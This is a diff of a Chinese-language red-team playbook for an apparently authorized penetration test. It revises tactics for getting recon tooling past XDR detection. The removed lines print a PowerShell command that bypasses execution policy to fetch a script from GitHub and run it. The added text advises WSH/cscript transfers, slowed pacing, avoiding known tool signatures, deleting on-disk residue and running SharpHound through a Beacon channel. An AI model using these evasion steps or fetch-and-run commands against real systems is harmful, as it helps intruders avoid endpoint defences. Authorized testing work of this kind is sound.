@@ -92,24 +92,50 @@ day2-kit/
 
 ## 远程加载被 XDR 杀时（行为层）
 
-cradle 死因：同一进程里「下载 → 解码 → 执行」的行为链是 XDR 的经典规则，
-`iex (iwr ...)` 这种写法在命令行/脚本块日志里一眼可辨。改成**两段式 + 换进程**：
+cradle 死因：同一进程里「下载 → 解码 → 执行」的行为链是 XDR 的经典规则。
+`DownloadFile` 单独成进程也会死——命中的是「PS 网络暂存器」规则
+（powershell.exe → HTTP → 落盘，目的地是公开 CDN 更是加分项）。
+**结论：PowerShell 一律不联网。** 下载换引擎，执行换进程：
 
-```powershell
-# 1) 只下载，不执行（无 cradle 特征）
-powershell -ep bypass -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/tiaodan577-glitch/day2-kit/main/ps1/Get-Files.ps1', \"$env:TEMP\gf.ps1\")"
-# 2) 新进程执行下载器，把全套取回本地
-powershell -ep bypass -f "$env:TEMP\gf.ps1"
-# 3) 再开一个新进程，从磁盘跑（进程间不共享行为链）
-powershell -ep bypass -f "$env:TEMP\day2-kit\ps1\Get-LocalRecon.ps1"
+```text
+优先级1  浏览器下载 main.zip（纯文本包）→ 资源管理器解压 → 新进程执行
+优先级2  cscript //nologo wsh\transfer.vbs <raw-base> %TEMP%\day2-kit   （WSH 引擎，规则面不同）
+优先级3  热点 HTTP（Day1 验证）+ 浏览器/cscript 拉取，发起方不用 PowerShell
+禁止     powershell + 任何联网 API（IWR/DownloadFile/Start-BitsTransfer/curl.exe）
 ```
 
-或者干脆走热点 HTTP（Day1 已验证）：拉取行为本身不出现在客户出网链路。
+执行纪律：下载与执行永远分进程；刚爆红的动作歇 15–30 分钟再动；
+主动跟对接人说明测试动作，别让 SOC 当入侵处置。
 
 **SharpHound 暂缓**：`Assembly.Load` 后 XDR 会扫内存里的程序集类型名，SharpHound 的
 类型元数据是记了特征的——base64 只解决落地/AMSI，解决不了内存识别。域内信息先用
 变形版 PowerView 顶（信任/ACL/委派/用户都有）；SharpHound 等 Beacon 通道建好后
 走 execute-assembly/BOF 再跑，那条链路的进程上下文完全不同。
+
+## 全红应急（连续触发告警时）
+
+红源判断：传输换了三轮还红 → **红的是工具行为本身**（服务枚举链、LDAP 爆量、
+内存程序集类型名），不是通道。此时做减法：
+
+1. **已知工具全部停用**（PowerUp/PowerView/JAWS/SessionGopher/PrivescCheck/SharpHound）。
+   它们留在仓库里等 Beacon 通道，执行序列里不要出现。
+2. **只跑这套**（自写 + 系统自带，行为特征最小）：
+   ```bat
+   bat\99-run-all.bat
+   cscript //nologo wsh\run-all.wsf
+   powershell -ep bypass -file ps1\Get-LocalRecon.ps1
+   powershell -ep bypass -file ps1\Get-DomainInfo.ps1
+   ```
+   域内核心情报（信任/域管/委派/Kerberoastable/GPO/弱 ACL）在 `Get-DomainInfo.ps1` 里，
+   用裸 LDAP 查的，没有已知工具的查询模式特征。
+3. **降速**：每步之间隔 10 分钟以上，别让行为链连成串。
+4. **清场**：`%TEMP%` 里若有 `SharpHound.exe.b64`、`tools-obf\` 之类的落地残留，删掉
+   （编码 PE 启发式会盯这类文件）。
+5. **还红就只剩纯 cmd**：`bat\` 套件是最终底线（全部内置命令），加上手敲
+   `nltest` / `net group` / `reg query`。探测暂停，转报告整理和社工/物理面准备。
+
+纪律：爆红期间不要换马甲重试同一个动作；告警响应机制没跟客户对齐之前，
+提权类动作（服务创建/计划任务/令牌）一律不动。
 
 ## 脚本被杀时怎么办（分诊）
 
